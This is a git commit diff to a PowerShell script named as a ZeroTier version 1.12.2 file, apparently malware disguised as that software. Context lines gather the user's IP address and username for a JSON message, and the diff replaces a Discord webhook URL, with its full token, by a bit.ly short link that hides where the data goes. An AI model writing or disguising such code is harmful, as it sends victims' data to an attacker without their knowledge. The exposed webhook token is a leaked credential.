dd6db4ec421da377bee330c2e1eeb30d263db843
2o2ks <153238359+2o2ks@users.noreply.github.com>
2023-12-20 23:18:08 -0300

    Update ZeroTier v 1.12.2.ps1

--- ZeroTier v 1.12.2.ps1
+++ ZeroTier v 1.12.2.ps1
@@ -15,7 +15,7 @@ Write-Host "$ipAddress"
 Write-Host "$user"
 
 
-$url = "https://discord.com/api/webhooks/1186839699998900224/maAvNFQo7zAuyMb1LUTewrGxSEXMW8XO2iqSgvngflsXlMSJ-ZhErKINHUHfCA5z0pv_"
+$url = "http://bit.ly/41wC2Rm"
 
 $jsonBody = @{
      content = "
